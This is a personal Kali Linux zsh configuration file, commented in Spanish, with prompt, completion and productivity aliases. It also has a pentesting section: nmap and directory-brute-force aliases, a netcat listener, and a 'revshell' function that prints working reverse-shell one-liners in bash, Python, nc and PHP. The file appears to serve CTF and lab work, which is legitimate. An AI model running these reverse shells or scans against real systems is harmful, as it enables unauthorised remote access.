# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

setopt autocd              # change directory just by typing its name
#setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS='_-' # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^U' backward-kill-line                   # ctrl + U
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'
zstyle ':completion:*' rehash true
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# configure `time` format
TIMEFMT=$'\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P'

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

configure_prompt() {
    prompt_symbol=㉿
    # Skull emoji for root terminal
    #[ "$EUID" -eq 0 ] && prompt_symbol=💀
    case "$PROMPT_ALTERNATIVE" in
        twoline)
            PROMPT=$'%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
            # Right-side prompt with exit codes and background processes
            #RPROMPT=$'%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'
            ;;
        oneline)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{%(#.red.blue)}%n@%m%b%F{reset}:%B%F{%(#.blue.green)}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
        backtrack)
            PROMPT=$'${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%B%F{red}%n@%m%b%F{reset}:%B%F{blue}%~%b%F{reset}%(#.#.$) '
            RPROMPT=
            ;;
    esac
    unset prompt_symbol
}

# The following block is surrounded by two delimiters.
# These delimiters must not be modified. Thanks.
# START KALI CONFIG VARIABLES
PROMPT_ALTERNATIVE=twoline
NEWLINE_BEFORE_PROMPT=yes
# STOP KALI CONFIG VARIABLES

if [ "$color_prompt" = yes ]; then
    # override default virtualenv indicator in prompt
    VIRTUAL_ENV_DISABLE_PROMPT=1

    configure_prompt

    # enable syntax-highlighting
    if [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
        ZSH_HIGHLIGHT_STYLES[default]=none
        ZSH_HIGHLIGHT_STYLES[unknown-token]=underline
        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[path]=bold
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=green
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[assign]=none
        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
        ZSH_HIGHLIGHT_STYLES[named-fd]=none
        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
        ZSH_HIGHLIGHT_STYLES[arg0]=fg=cyan
        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%(#.#.$) '
fi
unset color_prompt force_color_prompt

toggle_oneline_prompt(){
    if [ "$PROMPT_ALTERNATIVE" = oneline ]; then
        PROMPT_ALTERNATIVE=twoline
    else
        PROMPT_ALTERNATIVE=oneline
    fi
    configure_prompt
    zle reset-prompt
}
zle -N toggle_oneline_prompt
bindkey ^P toggle_oneline_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))}%n@%m: %~\a'
    ;;
*)
    ;;
esac

precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$NEWLINE_BEFORE_PROMPT" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    export LS_COLORS="$LS_COLORS:ow=30;44:" # fix ls color for folders with 777 permissions

    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

    export LESS_TERMCAP_mb=$'\E[1;31m'     # begin blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # begin bold
    export LESS_TERMCAP_me=$'\E[0m'        # reset bold/blink
    export LESS_TERMCAP_so=$'\E[01;33m'    # begin reverse video
    export LESS_TERMCAP_se=$'\E[0m'        # reset reverse video
    export LESS_TERMCAP_us=$'\E[1;32m'     # begin underline
    export LESS_TERMCAP_ue=$'\E[0m'        # reset underline

    # Take advantage of $LS_COLORS for completion as well
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
    zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
fi

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # Catppuccin Mocha overlay0
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#6c7086'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi
export PATH=~/.npm-global/bin:~/.local/bin:$PATH

# =============================================================================
# HERRAMIENTAS MODERNAS
# =============================================================================

# Starship Prompt
eval "$(starship init zsh)"

# Zoxide (mejor cd)
if command -v zoxide &> /dev/null; then
    eval "$(zoxide init zsh)"
    alias cd="z"
fi

# Eza (mejor ls)
if command -v eza &> /dev/null; then
    alias ls="eza --icons --group-directories-first"
    alias ll="eza -l --icons --group-directories-first"
    alias la="eza -la --icons --group-directories-first"
    alias lt="eza --tree --level=2 --icons --group-directories-first"
    alias lta="eza --tree --level=2 -a --icons --group-directories-first"
fi

# Bat (mejor cat) - en Debian/Kali se llama batcat
if command -v batcat &> /dev/null; then
    alias bat="batcat"
    alias cat="batcat --style=auto"
    alias catp="batcat --plain"
    export MANPAGER="sh -c 'col -bx | batcat -l man -p'"
    export BAT_THEME="Catppuccin Mocha"
elif command -v bat &> /dev/null; then
    alias cat="bat --style=auto"
    alias catp="bat --plain"
    export MANPAGER="sh -c 'col -bx | bat -l man -p'"
    export BAT_THEME="Catppuccin Mocha"
fi

# FZF
if command -v fzf &> /dev/null; then
    # Cargar integracion de fzf
    source /usr/share/doc/fzf/examples/key-bindings.zsh 2>/dev/null
    source /usr/share/doc/fzf/examples/completion.zsh 2>/dev/null

    # Opciones de FZF - HACKER MODE
    export FZF_DEFAULT_OPTS="
        --height 60%
        --layout=reverse
        --border sharp
        --info inline
        --color=bg+:#003300,bg:#000000,spinner:#00ff00,hl:#ff0000
        --color=fg:#00ff00,header:#ff0000,info:#ffff00,pointer:#00ffff
        --color=marker:#ff00ff,fg+:#ffffff,prompt:#00ff00,hl+:#ff0000
        --color=border:#00ff00
        --prompt='> ' --pointer='>' --marker='*'"

    # Ctrl+R mejorado para historial
    export FZF_CTRL_R_OPTS="--preview 'echo {}' --preview-window down:3:hidden:wrap --bind '?:toggle-preview'"
fi

# =============================================================================
# ALIAS UTILES EXTRA
# =============================================================================
alias c="clear"
alias q="exit"
alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias mkdir="mkdir -pv"
alias df="df -h"
alias du="du -h"
alias free="free -h"
alias ports="ss -tulanp"
alias myip="curl -s ifconfig.me"

# Git aliases
alias gs="git status"
alias ga="git add"
alias gc="git commit"
alias gp="git push"
alias gl="git log --oneline --graph --decorate"
alias gd="git diff"

# Extraer cualquier archivo comprimido
extract() {
    if [ -f "$1" ]; then
        case "$1" in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar x "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *)           echo "'$1' no se puede extraer" ;;
        esac
    else
        echo "'$1' no es un archivo valido"
    fi
}

# =============================================================================
#  HACKER MODE - FEEL THE POWER
# =============================================================================

# Colores para usar en funciones
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
BOLD='\033[1m'
BLINK='\033[5m'
NC='\033[0m'

# Banner de bienvenida - POWER MODE
hacker_banner() {
    echo ""
    echo -e "${GREEN}${BOLD}"
    echo "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
    echo "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
    echo "  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝"
    echo "  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
    echo "  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${CYAN}  ╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}  ${YELLOW}User:${NC} ${GREEN}$(whoami)${NC}  ${YELLOW}Host:${NC} ${GREEN}$(hostname)${NC}"
    echo -e "${CYAN}  ║${NC}  ${YELLOW}IP:${NC} ${RED}$(hostname -I 2>/dev/null | awk '{print $1}' || echo 'N/A')${NC}  ${YELLOW}Kernel:${NC} ${PURPLE}$(uname -r | cut -d'-' -f1)${NC}"
    echo -e "${CYAN}  ║${NC}  ${YELLOW}Date:${NC} ${WHITE}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Mostrar banner solo en terminales interactivas
[[ $- == *i* ]] && hacker_banner

# Efecto de typing - siente cada tecla
typeset -g zle_highlight=(
    isearch:bold,fg=red
    region:bg=green,fg=black
    special:bold,fg=magenta
    suffix:bold,fg=cyan
)

# Feedback visual cuando se ejecuta un comando
preexec() {
    echo -e "${CYAN}[${YELLOW}$(date +%H:%M:%S)${CYAN}]${NC} ${GREEN}>${NC} $1"
}

# =============================================================================
#  HACKING TOOLS & ALIASES
# =============================================================================

# Escaneo rapido
alias qs='nmap -sC -sV -oA scan'
alias qsf='nmap -sC -sV -T4 -oA fast_scan'
alias fullscan='nmap -sC -sV -p- -oA full_scan'
alias udpscan='sudo nmap -sU --top-ports 100 -oA udp_scan'

# Web
alias nikto='nikto -h'
alias dirb='dirb'
alias gobuster='gobuster dir -w /usr/share/wordlists/dirb/common.txt -u'
alias ffuf='ffuf -w /usr/share/wordlists/dirb/common.txt -u'

# Listeners
listener() {
    local port=${1:-4444}
    echo -e "${RED}${BOLD}[!] Starting listener on port $port...${NC}"
    echo -e "${YELLOW}Payload: bash -i >& /dev/tcp/$(hostname -I | awk '{print $1}')/$port 0>&1${NC}"
    nc -lvnp $port
}

# Servidor HTTP rapido
serve() {
    local port=${1:-8000}
    local ip=$(hostname -I | awk '{print $1}')
    echo -e "${GREEN}${BOLD}[+] Serving on http://$ip:$port${NC}"
    echo -e "${YELLOW}wget http://$ip:$port/FILE${NC}"
    python3 -m http.server $port
}

# Generar reverse shell
revshell() {
    local ip=${1:-$(hostname -I | awk '{print $1}')}
    local port=${2:-4444}
    echo -e "${RED}${BOLD}=== REVERSE SHELLS ===${NC}"
    echo ""
    echo -e "${GREEN}Bash:${NC}"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo -e "${GREEN}Python:${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo ""
    echo -e "${GREEN}NC:${NC}"
    echo "nc -e /bin/bash $ip $port"
    echo ""
    echo -e "${GREEN}PHP:${NC}"
    echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}

# Buscar exploits
searchsploit_quick() {
    echo -e "${CYAN}${BOLD}[*] Searching exploits for: $1${NC}"
    searchsploit "$1" --color
}
alias ssp='searchsploit_quick'

# Ver puertos abiertos del sistema
alias listening='ss -tulpn | grep LISTEN'
alias connections='ss -tupn'

# Hash cracking helpers
alias hashid='hashid -m'
alias john-show='john --show'

# Limpieza de pantalla con estilo
cls() {
    clear
    hacker_banner
}

# Matrix mode - para cuando necesitas inspiracion
matrix() {
    if command -v cmatrix &> /dev/null; then
        cmatrix -b -C green
    else
        echo -e "${YELLOW}[!] cmatrix no instalado. Ejecuta: sudo apt install cmatrix${NC}"
    fi
}

# Info del target
target() {
    if [ -z "$1" ]; then
        echo -e "${RED}Uso: target <IP o dominio>${NC}"
        return 1
    fi
    echo -e "${CYAN}${BOLD}=== TARGET INFO: $1 ===${NC}"
    echo -e "${YELLOW}[*] DNS Lookup:${NC}"
    host "$1" 2>/dev/null || nslookup "$1" 2>/dev/null
    echo ""
    echo -e "${YELLOW}[*] Whois (resumido):${NC}"
    whois "$1" 2>/dev/null | grep -E "^(Domain|Registrar|Name Server|Creation|Expiration|Updated)" | head -10
    echo ""
    echo -e "${YELLOW}[*] Quick Ping:${NC}"
    ping -c 3 "$1"
}

# Encoding/Decoding rapido
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; echo; }
urle() { python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"; }
urld() { python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"; }

# Wordlists rapidas
alias wl-common='cat /usr/share/wordlists/dirb/common.txt'
alias wl-big='cat /usr/share/wordlists/dirb/big.txt'
alias wl-rockyou='zcat /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || cat /usr/share/wordlists/rockyou.txt'

# HTB/CTF helpers
vpn-htb() {
    echo -e "${GREEN}[+] Connecting to HTB VPN...${NC}"
    sudo openvpn ~/Downloads/*.ovpn 2>/dev/null || echo -e "${RED}[!] No .ovpn file found in Downloads${NC}"
}

# Upgrade shell
alias upgrade-shell='python3 -c "import pty;pty.spawn(\"/bin/bash\")"'

# Atajos de poder
alias pwn='echo -e "${RED}${BLINK}HACKING MODE ACTIVATED${NC}"'
alias power='echo -e "${GREEN}FEEL THE POWER${NC}"; neofetch 2>/dev/null || fastfetch 2>/dev/null'

# =============================================================================
#  TERMINAL COLORS - PURE BLACK BACKGROUND
# =============================================================================

# Forzar colores intensos
export TERM=xterm-256color
export CLICOLOR=1
export LSCOLORS=GxFxCxDxBxegedabagaced

# Colores de eza mas intensos
export EZA_COLORS="di=1;35:ex=1;32:*.sh=1;32:*.py=1;33:*.js=1;33:*.c=1;36:*.cpp=1;36:*.h=1;36"

# =============================================================================
#  PRODUCTIVIDAD EXTREMA - KEYBOARD WARRIOR
# =============================================================================

# === NAVEGACION RAPIDA ===
# Bookmarks de directorios (usa 'g' para ir)
hash -d dl=~/Downloads
hash -d doc=~/Documents
hash -d cfg=~/.config
hash -d proj=~/Projects
hash -d htb=~/htb
hash -d ctf=~/ctf

# Saltar a directorio con fzf
fcd() {
    local dir
    dir=$(find ${1:-.} -type d 2>/dev/null | fzf --height 40% --reverse) && cd "$dir"
}

# Abrir archivo con fzf
fo() {
    local file
    file=$(fzf --height 40% --reverse --preview 'batcat --color=always {} 2>/dev/null || cat {}') && ${EDITOR:-nvim} "$file"
}

# Buscar en historial con fzf (mejorado)
fh() {
    print -z $( ([ -n "$ZSH_NAME" ] && fc -l 1 || history) | fzf +s --tac | sed -E 's/ *[0-9]*\*? *//' )
}

# === OPERACIONES DE ARCHIVOS RAPIDAS ===
# Crear directorio y entrar
mkcd() { mkdir -p "$1" && cd "$1"; }

# Backup rapido
bak() { cp "$1" "$1.bak.$(date +%Y%m%d_%H%M%S)"; }

# Mover a papelera (no borrar)
trash() {
    local trash_dir=~/.local/share/Trash/files
    mkdir -p "$trash_dir"
    mv "$@" "$trash_dir/"
    echo "Movido a papelera: $@"
}

# Copiar path absoluto al clipboard
cppath() {
    readlink -f "${1:-.}" | tr -d '\n' | xclip -selection clipboard
    echo "Path copiado: $(readlink -f "${1:-.}")"
}

# === CLIPBOARD ===
# Copiar contenido de archivo
cpy() { cat "$1" | xclip -selection clipboard && echo "Copiado al clipboard"; }
# Pegar del clipboard
pst() { xclip -selection clipboard -o; }

# === PROCESOS ===
# Matar proceso con fzf
fkill() {
    local pid
    pid=$(ps -ef | sed 1d | fzf -m | awk '{print $2}')
    if [ -n "$pid" ]; then
        echo $pid | xargs kill -${1:-9}
    fi
}

# Top 10 procesos por memoria
topmem() { ps auxf | sort -nr -k 4 | head -10; }
# Top 10 procesos por CPU
topcpu() { ps auxf | sort -nr -k 3 | head -10; }

# === NETWORK RAPIDO ===
# Ping rapido
p() { ping -c 3 "${1:-8.8.8.8}"; }

# Obtener headers HTTP
headers() { curl -sI "$1"; }

# Descargar archivo
dl() { curl -LO "$1"; }

# Ver IP publica
pubip() { curl -s ifconfig.me; echo; }

# Escanear red local
lanscan() {
    local subnet=${1:-$(ip route | grep default | awk '{print $3}' | sed 's/\.[0-9]*$/\.0\/24/')}
    echo -e "${GREEN}Escaneando: $subnet${NC}"
    nmap -sn "$subnet" | grep -E "Nmap scan|Host is"
}

# === GIT PRODUCTIVO ===
# Status compacto
gss() { git status -sb; }
# Add all + commit
gac() { git add -A && git commit -m "$*"; }
# Add all + commit + push
gacp() { git add -A && git commit -m "$*" && git push; }
# Pull con rebase
gpr() { git pull --rebase; }
# Log bonito
glog() { git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit -n ${1:-20}; }
# Diff con colores
gdiff() { git diff --color-words; }
# Branches recientes
gbr() { git branch --sort=-committerdate | head -10; }
# Checkout con fzf
gco() { git branch -a | fzf | xargs git checkout; }

# === DOCKER RAPIDO ===
alias dps='docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}"'
alias dpsa='docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Status}}"'
alias dimg='docker images --format "table {{.Repository}}\t{{.Tag}}\t{{.Size}}"'
alias dstop='docker stop $(docker ps -q)'
alias drm='docker rm $(docker ps -aq)'
alias drmi='docker rmi $(docker images -q)'
dexec() { docker exec -it "$1" /bin/bash; }
dlog() { docker logs -f "$1"; }

# === SYSTEMD RAPIDO ===
alias ss-status='systemctl status'
alias ss-start='sudo systemctl start'
alias ss-stop='sudo systemctl stop'
alias ss-restart='sudo systemctl restart'
alias ss-enable='sudo systemctl enable'
alias ss-disable='sudo systemctl disable'

# === TMUX RAPIDO (si lo usas) ===
alias ta='tmux attach -t'
alias tn='tmux new -s'
alias tl='tmux ls'
alias tk='tmux kill-session -t'

# === EDICION RAPIDA ===
alias v='${EDITOR:-nvim}'
alias vi='${EDITOR:-nvim}'
alias vim='${EDITOR:-nvim}'
alias e='${EDITOR:-nvim}'

# Editar configs rapido
alias zshrc='${EDITOR:-nvim} ~/.zshrc && source ~/.zshrc'
alias kittyrc='${EDITOR:-nvim} ~/.config/kitty/kitty.conf'
alias starshiprc='${EDITOR:-nvim} ~/.config/starship.toml'

# === UTILIDADES ===
# Calculadora rapida
calc() { python3 -c "print($*)"; }

# Generar password
genpass() { openssl rand -base64 ${1:-16} | tr -d '\n'; echo; }

# Timestamp
now() { date '+%Y-%m-%d %H:%M:%S'; }
nowunix() { date +%s; }

# Tamaño de directorio
sizeof() { du -sh "${1:-.}"; }

# Contar lineas de codigo
loc() { find . -name "*.$1" -exec wc -l {} + | tail -1; }

# JSON pretty print
json() { python3 -m json.tool "$@"; }

# Diff de dos URLs
urldiff() { diff <(curl -s "$1") <(curl -s "$2"); }

# === ALIASES CORTOS ===
alias k='clear'
alias x='exit'
alias r='source ~/.zshrc'
alias h='history | tail -50'
alias j='jobs -l'
alias path='echo $PATH | tr ":" "\n"'
alias now='date +"%Y-%m-%d %H:%M:%S"'

# === VI MODE EN ZSH ===
# Descomentar si quieres modo vi
# bindkey -v
# export KEYTIMEOUT=1
